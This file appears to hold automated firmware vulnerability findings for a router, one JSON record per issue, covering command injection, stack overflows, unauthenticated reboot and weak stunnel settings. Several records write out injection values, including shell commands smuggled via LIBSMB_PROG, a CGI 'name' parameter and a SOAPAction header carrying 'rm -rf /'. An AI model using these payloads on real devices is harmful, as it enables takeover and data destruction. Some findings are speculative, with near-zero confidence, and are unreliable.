{"name": "script-erasenvram-dangerous_operation", "file_path": "etc/scripts/erase_nvram.sh", "location": "etc/scripts/erase_nvram.sh:1-15", "risk_score": 4.0, "confidence": 5.5, "description": "This script implements the NVRAM erase functionality, with the core operation being writing 32 bytes of zero values to the /dev/mtdblock device via the dd command. Specific trigger conditions: 1) The system must have an MTD partition named 'nvram' 2) The /proc/mtd file must be parsable normally. The script lacks boundary checking or input validation mechanisms. If /proc/mtd is tampered with (e.g., through symlink attacks or kernel vulnerabilities), critical partitions may be accidentally erased. Actual security impact: Attackers must first obtain execution privileges to trigger this, constituting a destructive operation after privilege escalation that may brick the device. Exploitation method: Trigger script execution by combining with other vulnerabilities (e.g., command injection).", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["/proc/mtd", "nvram", "mtdblock", "NVRAM_MTD_NUM", "NVRAM_MTDBLOCK", "dd if=/dev/zero"], "notes": "Pending verification: 1) Permission and protection mechanisms of the /proc/mtd file 2) Review whether the parent components (such as web interfaces/cron tasks) calling this script contain command injection vulnerabilities. Related file: /proc/mtd (kernel interface)"}
{"name": "configuration_load-webaccess_map_storage", "file_path": "REDACTED_SENSITIVE_DATA", "location": "webaccess_map.php:76-94", "risk_score": 0.0, "confidence": 4.75, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "fwrite(\"w\",$map, $echo_string)", "/var/run/storage_map", "unique_partition_name"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command_execution-settime-time_format_validation", "file_path": "etc/scripts/settime.sh", "location": "etc/scripts/settime.sh:7", "risk_score": 6.0, "confidence": 8.75, "description": "Time format validation missing vulnerability: The script takes the $1 parameter as a time value (HH:MM:SS) and directly concatenates it into the date command. Although double quotes are used to prevent command injection, there is no validation to ensure the input format matches expectations. An attacker could pass malformed input (such as excessively long strings or special characters), causing the date command to fail and resulting in abnormal time settings. Trigger condition: When an attacker can control the $1 parameter used to call this script. Actual impact: 1) Incorrect system time causing time-sensitive services to fail 2) Error log flooding potentially affecting /dev/console", "code_snippet": "date -u \"$D-$1\" > /dev/console 2>&1", "link_identifiers": ["$1", "date -u \"$D-$1\"", "/dev/console"], "notes": "Track the source of the $1 parameter: 1) Check the parent component (e.g., web interface) that calls this script 2) Verify whether input filtering mechanisms exist 3) Analyze the schedule service's dependency on system time"}
{"name": "command_execution-settime-unconditional_service", "file_path": "etc/scripts/settime.sh", "location": "etc/scripts/settime.sh:8", "risk_score": 4.0, "confidence": 8.0, "description": "Unconditional Service Enablement Risk: The script unconditionally executes 'service schedule on' immediately after running the 'date' command. If time setting fails and results in an abnormal state, it may cause the service to operate on an incorrect time reference. Combined with time format vulnerabilities, this forms a denial-of-service chain: abnormal time input â†’ time setting failure â†’ service running on an erroneous time basis.", "code_snippet": "service schedule on", "link_identifiers": ["service schedule on", "date -u"], "notes": ""}
{"name": "file_read-usbmount_helper.php-missing", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 0.0, "confidence": 10.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["usbmount_helper.php"], "notes": "Follow-up recommendations: 1) Ask the user to verify whether the etc/scripts directory exists in the firmware 2) Check the firmware extraction log to confirm integrity 3) If file absence is confirmed, shift focus to analyzing other USB-related components such as /sbin/usbmount or /proc/scsi/usb-storage"}
{"name": "command_injection-env-LIBSMB_PROG", "file_path": "sbin/smbd", "location": "fcn.000ca918:0xcaa40", "risk_score": 9.8, "confidence": 8.75, "description": "High-risk command injection vulnerability: Attackers can inject arbitrary commands by tampering with the 'LIBSMB_PROG' environment variable. Trigger conditions: 1) Attacker sets malicious environment variables through other components (e.g., web interface or startup scripts) 2) smbd calls system() when executing to function fcn.0006ed40. Exploitation method: Set `LIBSMB_PROG=/bin/sh -c 'malicious command'` to gain REDACTED_PASSWORD_PLACEHOLDER privileges. Constraints: Relies on environment variable pollution mechanism, but this condition is easily satisfied due to common service interactions in firmware.", "code_snippet": "system(param_1); // param_1[HIDDEN]getenv(\"LIBSMB_PROG\")", "link_identifiers": ["LIBSMB_PROG", "getenv", "system", "fcn.0006ed40", "fcn.000ca918"], "notes": "Verify subsequent environment variable pollution paths (such as HTTP interfaces or startup scripts). Related note: Records for 'getenv' and 'system' already exist in the knowledge base."}
{"name": "path_traversal-env-LANGUAGE", "file_path": "sbin/smbd", "location": "fcn.000d2cc4:0xd2d6c", "risk_score": 8.5, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "asprintf(&path, \"%s.msg\", getenv(\"LANGUAGE\"));\nstat64(path, &stat_buf);", "link_identifiers": ["LANGUAGE", "getenv", "stat64", "msg_file_parser", "fcn.000d2cc4"], "notes": "Need to verify whether the .msg file parsing logic introduces secondary vulnerabilities. Related hint: 'getenv' has existing records in the knowledge base."}
{"name": "network_input-SMB_recvfrom", "file_path": "sbin/smbd", "location": "fcn.000804dc â†’ fcn.0005a0ac", "risk_score": 8.0, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["SMB_protocol_handler", "recvfrom", "network_buffer", "fcn.0005a0ac", "SMB_command_data"], "notes": "It is recommended to conduct further analysis on specific SMB command processing functions (such as SMBwrite)."}
{"name": "speculative-USB-usbmount_helper", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 5.0, "confidence": 0.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "N/A ([HIDDEN])", "link_identifiers": ["usbmount_helper.sh", "ACTION", "DEVNAME", "mount", "umount", "/etc/hotplug.d/usb"], "notes": "Follow-up analysis recommendations: 1) Directly retrieve and verify raw filesystem contents 2) Examine the triggering mechanism in /etc/hotplug.d/usb 3) Review the security of environment variable usage in USB event handling processes. Related findings: Knowledge base contains ACTION keyword-related records (etc/init0.d/S52wlan.sh), potentially forming cross-component event handling chains."}
{"name": "file_write-WEBACCESS-storage_account_root", "file_path": "REDACTED_SENSITIVE_DATA", "location": "WEBACCESS.php:57-114", "risk_score": 8.5, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "fwrite(\"w\", $ACCOUNT, \"REDACTED_PASSWORD_PLACEHOLDER:x\".$admin_disklist.\"\\n\");\nfwrite(\"a\", $ACCOUNT, query(\"REDACTED_PASSWORD_PLACEHOLDER\").\":x\".$storage_msg.\"\\n\");", "link_identifiers": ["setup_wfa_account", "fwrite", "/var/run/storage_account_root", "query(\"/webaccess/enable\")", "REDACTED_SENSITIVE_DATA", "comma_handle"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "configuration_load-WEBACCESS-comma_handle", "file_path": "REDACTED_SENSITIVE_DATA", "location": "WEBACCESS.php:25-55", "risk_score": 7.0, "confidence": 7.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["comma_handle", "REDACTED_SENSITIVE_DATA", "cut_count", "REDACTED_SENSITIVE_DATA", "setup_wfa_account"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command_execution-WEBACCESS-startcmd", "file_path": "REDACTED_SENSITIVE_DATA", "location": "WEBACCESS.php:6-8, 195-217", "risk_score": 9.0, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "startcmd(\"killall -9 fileaccessd\");\nstartcmd(\"service HTTP restart\");", "link_identifiers": ["startcmd", "stopcmd", "killall", "service", "iptables", "fwrite"], "notes": "A complete attack chain must be established: 1) Gain control over the writing of $START/$STOP files 2) Leverage file control to trigger command execution"}
{"name": "speculative-exploit_chain-USB_to_command_execution", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 7.5, "confidence": 1.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "N/A ([HIDDEN])", "link_identifiers": ["exploit_chain", "ACTION", "usbmount_helper.sh", "rtcfg.php", "S52wlan.sh", "command_injection"], "notes": "Correlation Discovery: 1) speculative-USB-usbmount_helper 2) command_execution-WIFI-dynamic_script_execution. Verification Requirements: Check whether /etc/hotplug.d/usb invokes global environment variables; Analyze the filtering logic of the ACTION parameter in rtcfg.php."}
{"name": "analysis_task-env_set_audit", "file_path": "sbin/smbd", "location": "[HIDDEN]", "risk_score": 0.0, "confidence": 5.0, "description": "Critical Audit Task: Verify environmental variable pollution paths. Analysis required: 1) Check whether /etc/init.d/ and /etc/scripts/ startup scripts contain setenv('LIBSMB_PROG') or setenv('LANGUAGE') calls 2) Determine if web interfaces (e.g., fileaccess.cgi) under /htdocs/ directory set these environment variables via HTTP parameters 3) Assess whether NVRAM storage mechanism affects variable values. Successful verification will complete the attack chain for command injection and path traversal vulnerabilities.", "link_identifiers": ["setenv", "LIBSMB_PROG", "LANGUAGE", "/etc/init.d", "/htdocs"], "notes": "Related vulnerabilities: command_injection-env-LIBSMB_PROG and path_traversal-env-LANGUAGE"}
{"name": "command_injection-setdate.sh-param1", "file_path": "etc/scripts/setdate.sh", "location": "setdate.sh:5-12", "risk_score": 8.5, "confidence": 6.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "Y=`echo $1 | cut -d/ -f3`\nM=`echo $1 | cut -d/ -f1`\nD=`echo $1 | cut -d/ -f2`\ndate -u \"$Y.$M.$D-$T\"", "link_identifiers": ["$1", "echo $1", "cut -d/", "date -u", "Y", "M", "D", "setdate.sh"], "notes": "Correlate with existing findings in the knowledge base: 1) The '$1' parameter passing pattern is widely present 2) Three relevant tracking suggestions exist in the notes field. Tool limitations: a) Unable to validate call sources across directories b) Did not analyze the www directory to confirm web call chains. Next steps: Check whether CGI/PHP scripts pass unfiltered parameters to this script."}
{"name": "stack_overflow-mDNS-core_receive-memcpy", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SECRET_KEY_PLACEHOLDER:0x31560 sym.mDNSCoreReceive", "risk_score": 9.5, "confidence": 8.75, "description": "A critical stack overflow vulnerability was discovered in the DNS response handling logic of REDACTED_SECRET_KEY_PLACEHOLDER. Specific manifestation: When processing DNS resource records (at address 0x31560), the memcpy operation uses an externally controllable length parameter (r2 + 0x14) to copy data to a stack buffer (near the fp pointer) without boundary checks. Trigger condition: An attacker sends a specially crafted DNS response packet where the RDATA length field is set to a sufficiently large value (requiring r2+0x14 > target buffer capacity). Exploitation method: Program flow hijacking can be achieved by overwriting the return address on the stack, and remote code execution can be accomplished when combined with a ROP chain. Security impact: Since the mDNS service listens on 5353/UDP by default and is exposed on the local network, this vulnerability can be directly exploited by attackers within the same network.", "code_snippet": "add r2, r2, 0x14\nbl sym.imp.memcpy  ; [HIDDEN]=fp, [HIDDEN]=r2", "link_identifiers": ["memcpy", "mDNSCoreReceive", "RDATA", "REDACTED_SENSITIVE_DATA", "fp", "var_0h_3", "REDACTED_SECRET_KEY_PLACEHOLDER"], "notes": "Further verification is required for: 1) Exact target buffer size 2) Return address offset in stack layout 3) System protection mechanisms (ASLR/NX) status. Recommended to dynamically test the minimum trigger length. Related hint: Check if other data flows (such as NVRAM or configuration files) could influence the buffer size parameter."}
{"name": "stack_overflow-udevd-netlink_handler", "file_path": "sbin/udevd", "location": "sbin/udevd:0xac14 (fcn.0000a2d4)", "risk_score": 9.0, "confidence": 9.0, "description": "The NETLINK_KOBJECT_UEVENT socket handling contains a stack overflow vulnerability. Specific manifestation: In the fcn.0000a2d4 function, recvmsg() writes data to a fixed 292-byte stack buffer (var_3c24h) without length validation. Trigger condition: An attacker sends a message exceeding 292 bytes via NETLINK socket. Potential impact: Overwriting the return address enables arbitrary code execution, and combined with the firmware not enabling ASLR/NX, the exploitation success rate is extremely high.", "code_snippet": "iVar14 = sym.imp.recvmsg(uVar1, puVar26 + 0xffffffa4, 0); // [HIDDEN]", "link_identifiers": ["fcn.0000a2d4", "recvmsg", "NETLINK_KOBJECT_UEVENT", "var_3c24h", "msghdr", "0xac14"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "command_injection-udevd-remote_exec", "file_path": "sbin/udevd", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 10.0, "confidence": 9.65, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "if (strncmp(local_418, \"CMD:\", 4) == 0) { execv(processed_cmd, ...) }", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "execv", "recv", "CMD:", "0xb354"], "notes": "Pollution path: Network data â†’ recv buffer â†’ execv parameters. Recommendation: Check exposed service ports. Related to stack overflow vulnerability in same file (fcn.0000a2d4)."}
{"name": "command_generation-FIREWALL-global_var_command", "file_path": "REDACTED_SENSITIVE_DATA", "location": "FIREWALL/firewall.php:13-30", "risk_score": 2.0, "confidence": 5.0, "description": "The file uses hardcoded network interface names ('WAN-*'/'LAN-*') to generate IPTables service restart commands, which are written to global variables $START/$STOP. There are no external input points (such as $_GET/$_POST) or direct dangerous function calls. Potential security risks require two conditions to be met: a) The global variables $START/$STOP are contaminated by other components (requiring REDACTED_PASSWORD_PLACEHOLDER privileges); b) XNODE_getpathbytarget returns a malicious path. The current file lacks input validation mechanisms but has no direct trigger path. If these conditions are met, arbitrary command execution may occur, though the actual probability of exploitation is low.", "code_snippet": "$ifname = \"WAN-\".$i;\nfwrite(\"a\",$_GLOBALS[\"START\"], \"service IPT.\".$ifname.\" restart\\n\");", "link_identifiers": ["XNODE_getpathbytarget", "$ifname", "$START", "$STOP", "WAN-", "LAN-", "IPT."], "notes": "Cross-directory verification required: 1) How to use $START/$STOP variables in /etc/init.d/ scripts 2) Implementation of XNODE_getpathbytarget function (likely located in core library) 3) Security of network interface configuration storage locations (NVRAM/configuration files)"}
{"name": "command_execution-httpsvcs_upnpsetup-command_injection", "file_path": "etc/services/UPNP.LAN-1.php", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 6.75, "description": "The current file directly calls upnpsetup('LAN-1') using hardcoded parameters, presenting no immediate vulnerability. However, the dependent upnpsetup function in httpsvcs.php contains a command injection vulnerability: 1) When executing 'delpathbytarget.sh' via stopcmd, it directly concatenates the $name parameter (L92-93); 2) When executing the 'event' command via startcmd, it concatenates $name (L135). Trigger condition: When $name contains command separators (e.g., ;rm -rf /) and is tainted by external input. Security impact: If $name is controllable, an attacker could achieve arbitrary command execution with REDACTED_PASSWORD_PLACEHOLDER privileges, with success probability dependent on the accessibility of the taint source.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["upnpsetup", "$name", "stopcmd", "startcmd", "delpathbytarget.sh", "event"], "notes": "Verify the contamination paths: 1) HTTP parameter processing in /htdocs/cgibin 2) NVRAM settings interface 3) UPNP device description file generation logic"}
{"name": "configuration_load-UPNP_LAN-1-fixed_parameter", "file_path": "etc/services/UPNP.LAN-1.php", "location": "etc/services/UPNP.LAN-1.php:0 ([HIDDEN])", "risk_score": 0.5, "confidence": 4.5, "description": "The file has no direct external input points, and all operations are based on fixed logic: 1) Include httpsvcs.php 2) Write the service status file 3) Call upnpsetup with fixed parameters. Constraints: The $name parameter is hardcoded ('LAN-1'/'WAN-2') in both the current file and the services directory call chain, with no input validation required.", "link_identifiers": ["include", "fwrite", "$START", "$STOP", "LAN-1", "upnpsetup"], "notes": "Safely invoke the upnpsetup function in httpsvcs.php (with hardcoded parameters), while exposing its underlying vulnerabilities"}
{"name": "env_set-PATH_expansion-vulnerability", "file_path": "etc/profile", "location": "etc/profile:1", "risk_score": 7.0, "confidence": 7.5, "description": "The PATH environment variable was expanded to include the /mydlink directory without security validation. Attackers could exploit this vulnerability to execute malicious code through path hijacking, requiring two trigger conditions: 1) The /mydlink directory has a write permission vulnerability (e.g., achieved via the $MYDLINK mount vulnerability); 2) System processes execute commands without specifying absolute paths (e.g., mount calls by ntfs-3g). When these conditions are met, it can form a complete RCE attack chain in conjunction with an environment variable injection vulnerability.", "code_snippet": "PATH=$PATH:/mydlink", "link_identifiers": ["PATH", "/mydlink", "execl", "mount", "MYDLINK"], "notes": "Attack chain correlation: 1) $MYDLINK pollution control/mydlink content (etc/init.d/S22mydlink.sh) 2) ntfs-3g environment variable injection vulnerability (sbin/ntfs-3g). Priority verification required: 1) Default permissions of /mydlink directory 2) Location of $MYDLINK definition in firmware boot process."}
{"name": "network_input-cgibin-command_injection_0x1e478", "file_path": "htdocs/cgibin", "location": "htdocs/cgibin:0x1e478", "risk_score": 9.5, "confidence": 9.4, "description": "High-risk command injection vulnerability: Attackers can inject arbitrary commands into the popen call via the QUERY_STRING parameter 'name'. Trigger condition: Accessing a specific CGI endpoint while controlling the name parameter value (e.g., `name=';reboot;'`). No input filtering or boundary checks are performed, as the input is directly concatenated and executed. Exploitation probability is extremely high, allowing complete device control.", "code_snippet": "snprintf(cmd_buf, 0x3ff, \"rndimage %s\", getenv(\"QUERY_STRING\")+5);\npopen(cmd_buf, \"r\");", "link_identifiers": ["name", "QUERY_STRING", "popen", "snprintf"], "notes": "Complete attack chain: HTTP request â†’ QUERY_STRING parsing â†’ command concatenation and execution"}
{"name": "network_input-cgibin-format_injection_0x1ca80", "file_path": "htdocs/cgibin", "location": "htdocs/cgibin:0x1ca80", "risk_score": 9.5, "confidence": 8.5, "description": "High-Risk Format String Injection Vulnerability: HTTP_SOAPACTION header content contaminates system command parameters via uninitialized stack variables. Trigger condition: Sending an HTTP request containing a SOAPAction header (e.g., `SOAPAction: ;rm -rf /;`). No length check or content filtering exists, relying on stack layout to achieve injection.", "link_identifiers": ["HTTP_SOAPACTION", "system", "snprintf"], "notes": "Verify stack offset stability, recommend dynamic testing"}
{"name": "network_input-cgibin-unauth_op_0x1e094", "file_path": "htdocs/cgibin", "location": "htdocs/cgibin:0x1e094", "risk_score": 9.0, "confidence": 9.9, "description": "High-risk unauthorized operation: Directly triggering sensitive actions (reboot/factory reset/firmware update) via the HTTP_MTFWU_ACT header. Trigger condition: Setting the header value to 'Reboot'/'FactoryDefault'/'FWUpdate'. No permission verification, directly executing dangerous commands through system calls.", "link_identifiers": ["HTTP_MTFWU_ACT", "system", "event REBOOT"], "notes": "Composable Firmware Update Vulnerability Enables Persistent Attacks"}
{"name": "network_input-cgibin-stack_risk_0x0d218", "file_path": "htdocs/cgibin", "location": "htdocs/cgibin:fcn.0000d218", "risk_score": 4.0, "confidence": 7.0, "description": "Medium-risk stack operation vulnerability: The REMOTE_ADDR environment variable is copied via strncpy to a 40-byte stack buffer, with the copy length matching the buffer size. Trigger condition: Forged overly long IPv6 address (â‰¥40 bytes). Security impact: The target buffer lacks null termination, potentially affecting subsequent string comparison logic.", "link_identifiers": ["REMOTE_ADDR", "strncpy"], "notes": "Verify the actual limit of IP address length at the network layer"}
{"name": "config-stunnel-weak_client_verification", "file_path": "etc/stunnel.conf", "location": "etc/stunnel.conf", "risk_score": 9.0, "confidence": 9.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "verify = 0  # [HIDDEN]", "link_identifiers": ["verify", "client", "REDACTED_SENSITIVE_DATA"], "notes": "Initial shell acquisition requires leveraging other vulnerabilities; it is recommended to analyze entry points such as web services."}
{"name": "file-stunnel_key_permission_777", "file_path": "etc/stunnel.conf", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["cert", "REDACTED_SENSITIVE_DATA", "stunnel_cert.pem", "REDACTED_SENSITIVE_DATA"], "notes": "Set file permissions to 600 immediately"}
{"name": "config-stunnel_insecure_default_protocol", "file_path": "etc/stunnel.conf", "location": "etc/stunnel.conf", "risk_score": 7.0, "confidence": 7.5, "description": "The SSL protocol and cipher suites are not explicitly configured, using the stunnel default values (which may include insecure protocols such as SSLv3). Attackers can exploit protocol vulnerabilities (e.g., POODLE) to decrypt traffic. Trigger condition: The attacker is positioned in the network path between the client and the server.", "link_identifiers": ["sslVersion", "ciphers"], "notes": "The actual risk depends on the stunnel version; it is necessary to confirm the binary file version."}
{"name": "process-stunnel_root_privilege_escalation", "file_path": "etc/stunnel.conf", "location": "etc/stunnel.conf:4-5", "risk_score": 7.0, "confidence": 7.0, "description": "The service runs as REDACTED_PASSWORD_PLACEHOLDER with setuid=0 and lacks chroot configuration. If a memory corruption vulnerability exists, attackers can directly obtain REDACTED_PASSWORD_PLACEHOLDER privileges. Trigger condition: Exploiting stunnel's own vulnerabilities (e.g., buffer overflow).", "code_snippet": "setuid = 0\nsetgid = 0", "link_identifiers": ["setuid", "setgid", "chroot"], "notes": "It is recommended to run with reduced privileges and configure chroot isolation"}
{"name": "dos-hnap_reboot-unprotected_interface", "file_path": "REDACTED_SENSITIVE_DATA", "location": "Reboot.xml:5", "risk_score": 7.5, "confidence": 10.0, "description": "The document defines an unprotected HNAP reboot interface with the following characteristics: 1) It exposes a 'Reboot' action that unconditionally triggers device restart upon execution; 2) It lacks any parameter or precondition validation; 3) Attackers can craft malicious SOAP requests to directly invoke this interface for denial-of-service attacks. The actual impact depends on global access control policies, but the interface itself contains high-risk design flaws. Related findings include: a) The watchdog mechanism (mydlink/mydlink-watch-dog.sh) provides an internal system reboot path; b) S22mydlink.sh demonstrates a reboot scenario following NVRAM erasure.", "code_snippet": "<Reboot xmlns=\"http://purenetworks.com/HNAP1/\" />", "link_identifiers": ["Reboot", "http://purenetworks.com/HNAP1/", "soap:Body", "reboot"], "notes": "Cross-component analysis recommendations: 1) Verify whether the HNAP authentication mechanism is applied to this interface (associated CGI binary) 2) Combine with existing reboot paths (watchdog/S22mydlink) to form a multi-vector DoS attack chain 3) Validate if the SOAP request processing function is affected by other vulnerabilities (such as buffer overflow)"}
{"name": "network_input-HNAP.SetWanSettings-unvalidated_parameters", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.5, "confidence": 9.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["SetWanSettings", "LinkAggEnable", "Type", "REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_SENSITIVE_DATA", "ConfigDNS", "RussiaPPP", "DsLite_Configuration", "VPNIPAddress", "http://purenetworks.com/HNAP1/"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-HNAP-PortForwarding", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 7.5, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "REDACTED_SECRET_KEY_PLACEHOLDER", "TCPPorts", "UDPPorts", "LocalIPAddress", "REDACTED_SENSITIVE_DATA", "ScheduleName"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-HNAP_Login-exposed_parameters", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 7.0, "confidence": 9.0, "description": "The text defines the HNAP authentication interface's 'Login' action, exposing four client-controllable parameters: Action (action type), REDACTED_PASSWORD_PLACEHOLDER, LoginPassword, and Captcha (verification code). All parameter values are empty in the XML template, relying entirely on client submissions with no declared input validation mechanisms or boundary checks. Potential attack vectors: attackers could craft malicious inputs (such as excessively long REDACTED_PASSWORD_PLACEHOLDERs or passwords containing special characters) to attempt injection attacks or brute-force cracking, particularly since LoginPassword serves as authentication credentialsâ€”lack of backend filtering could directly lead to authentication bypass. Trigger condition: sending a specially crafted Login request to the HNAP interface.", "code_snippet": "<Login xmlns=\"http://purenetworks.com/HNAP1/\">\n  <Action></Action>\n  <REDACTED_PASSWORD_PLACEHOLDER></REDACTED_PASSWORD_PLACEHOLDER>\n  <LoginPassword></LoginPassword>\n  <Captcha></Captcha>\n</Login>", "link_identifiers": ["Login", "Action", "REDACTED_PASSWORD_PLACEHOLDER", "LoginPassword", "Captcha", "http://purenetworks.com/HNAP1/"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "exploit_chain-HNAP-CGI_injection", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["HTTP_SOAPACTION", "LocalIPAddress", "system", "snprintf", "HNAP"], "notes": "Verification required: 1) Whether HNAP requests are processed through htdocs/cgibin 2) Data flow path from LocalIPAddress to HTTP_SOAPACTION"}
{"name": "empty-file-htdocs-HNAP1-index.hnap", "file_path": "htdocs/HNAP1/index.hnap", "location": "htdocs/HNAP1/index.hnap", "risk_score": 0.0, "confidence": 5.0, "description": "The target file htdocs/HNAP1/index.hnap is an empty file (0 bytes), causing all analysis tasks to fail: 1) No HTTP parameter processing points can be identified 2) No external input flows can be traced 3) No code validation logic can be checked 4) No vulnerabilities are exploitable 5) No attack chain can be constructed. This file may be an invalid placeholder or corrupted file with no actual functionality in firmware operation.", "code_snippet": "", "link_identifiers": ["index.hnap"], "notes": "Follow-up recommendations: 1) Check other files in the same directory (e.g., *.cgi) 2) Analyze HTTP service components in /bin or /sbin 3) Verify the completeness of the firmware extraction process"}
{"name": "exploit_chain-HNAP-httpd-execve", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.5, "confidence": 8.0, "description": "Three-layer component attack chain: HNAP port forwarding interface â†’ httpd service â†’ CGI command execution vulnerability. Attack steps: 1) Inject commands (e.g., `';reboot;'`) via HNAP's LocalIPAddress 2) The httpd service parses HNAP requests and passes parameters to the CGI handler 3) The CGI handler executes tainted parameters via execve. Trigger conditions: a) LocalIPAddress lacks command delimiter filtering b) httpd has CGI functionality enabled (typically default-on) c) Requests are routed to the vulnerable code path. Full device control achievable.", "link_identifiers": ["LocalIPAddress", "execve", "sym.imp.execve", "piVar3[-7]", "HNAP", "HTTP"], "notes": "Verification Directions: 1) Dynamic testing whether HNAP requests trigger httpd's CGI routing 2) Examine how httpd parses HNAP's XML parameters"}
{"name": "REDACTED_SENSITIVE_DATA", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 0.0, "confidence": 5.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["libservice.php"], "notes": "analysis_failure"}
{"name": "network_input-login_form", "file_path": "REDACTED_SENSITIVE_DATA", "location": "index.php: HTML[HIDDEN]JavaScript[HIDDEN]", "risk_score": 6.5, "confidence": 9.25, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_PASSWORD_PLACEHOLDER", "get_by_id", "get_auth_info", "send_request", "XMLRequest", "exec_auth_cgi", "hex_hmac_md5"], "notes": "Verify whether the server-side CGI program (such as auth.cgi) contains dangerous operations that could complete the attack chain."}
{"name": "REDACTED_SENSITIVE_DATA", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SECRET_KEY_PLACEHOLDER.xml:7", "risk_score": 7.5, "confidence": 7.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "$result", "REDACTED_SENSITIVE_DATA", "include", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "firmware-upgrade-chain-HNAP", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SECRET_KEY_PLACEHOLDER.xml:0 ([HIDDEN])", "risk_score": 8.0, "confidence": 8.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA", "soap:Envelope", "REDACTED_SENSITIVE_DATA"], "notes": "Next steps: Analyze the firmware processing logic in the /htdocs/webinc directory; Compare with the include security mode of UPNP.LAN-1.php"}
{"name": "conditional-check-UPnP-REDACTED_SECRET_KEY_PLACEHOLDER", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SECRET_KEY_PLACEHOLDER.xml:9-10", "risk_score": 4.0, "confidence": 3.5, "description": "The commented-out UPnP media server check code (/upnpav/dms/active) suggests potential pre-condition verification for firmware upgrades. If this feature is enabled and uncommented, attackers could disrupt the upgrade process by manipulating UPnP states. Trigger condition: Device has media services enabled with activated code. Boundary constraint: Current feature remains disabled with no external access points exposed. Actual impact: Low, as the functionality is inactive.", "code_snippet": "//$enable = get(\"\",\"/upnpav/dms/active\");\n//if($enable==1) $enable = true; else $enable = false;", "link_identifiers": ["/upnpav/dms/active", "$enable"], "notes": "Global search /upnpav/dms/active to evaluate UPnP dependency risks; correlate with hardcoded patterns in UPNP.LAN-1.php"}
{"name": "info_leak-www_cgi-sensitive_data_exposure", "file_path": "htdocs/mydlink/info.cgi", "location": "info.cgi:5-9", "risk_score": 6.0, "confidence": 8.0, "description": "The info.cgi script directly exposes sensitive device information (model/firmware version/MAC address) through the hardcoded query() function. Trigger condition: Unauthenticated access to this CGI. Risk path: 1) Network input (HTTP request) â†’ 2) query() function call â†’ 3) Output of sensitive NVRAM path values. Actual impact: Information disclosure risk (relevance=8.5), which could escalate to command injection if vulnerabilities exist in the query() implementation.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["query", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA", "REDACTED_SENSITIVE_DATA"], "notes": "REDACTED_SENSITIVE_DATA"}
